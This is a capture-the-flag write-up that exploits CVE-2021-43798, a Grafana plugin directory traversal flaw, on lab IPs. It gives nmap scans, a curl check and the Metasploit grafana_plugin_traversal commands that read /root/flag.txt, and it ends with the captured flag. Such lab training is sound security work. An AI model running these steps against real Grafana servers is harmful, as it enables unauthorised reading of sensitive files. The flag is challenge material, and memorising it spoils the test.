# Vulnerability Exploitation Report: CVE-2021-43798

## Vulnerability Overview
**CVE ID**: CVE-2021-43798  
**CVSS Score**: 7.5 (High)  
**Description**: A directory traversal vulnerability in Grafana allows unauthenticated attackers to access arbitrary files on the server by exploiting a flaw in the plugin endpoint. This vulnerability can be used to read sensitive files outside the intended directory structure.

## Objective
Exploit the CVE-2021-43798 directory traversal vulnerability on a target Grafana instance to read the `/root/flag.txt` file as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.5
- **Target Port**: 3000 (Grafana default port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.5) to confirm the presence of Grafana.

```
nmap -sV 192.168.5.5
```

### Step 3: Verify Grafana Accessibility
Confirm the Grafana instance is accessible by sending an HTTP request to port 3000.

```
curl -L 192.168.5.5:3000
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 5: Search for Grafana Exploit
Search Metasploit for modules related to Grafana vulnerabilities.

```
search grafana
```

### Step 6: Select Grafana Plugin Traversal Module
Choose the Metasploit module for the Grafana directory traversal vulnerability.

```
use auxiliary/scanner/http/grafana_plugin_traversal
```

### Step 7: Configure the Target Host
Set the target host to the Grafana instanceâ€™s IP address.

```
set RHOSTS 192.168.5.5
```

### Step 8: Specify File to Read
Set the file path to the target file `/root/flag.txt`.

```
set FILEPATH /root/flag.txt
```

### Step 9: Execute the Exploit
Run the exploit to read the specified file via the directory traversal vulnerability.

```
exploit
```

### Step 10: Exit Metasploit
Exit the Metasploit console after the exploit completes.

```
exit
```

### Step 11: Retrieve the Loot
Access the file retrieved by Metasploit from the local loot directory.

```
cat /root/.msf4/loot/{fname}.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: VzuUll4HuCd7KOFw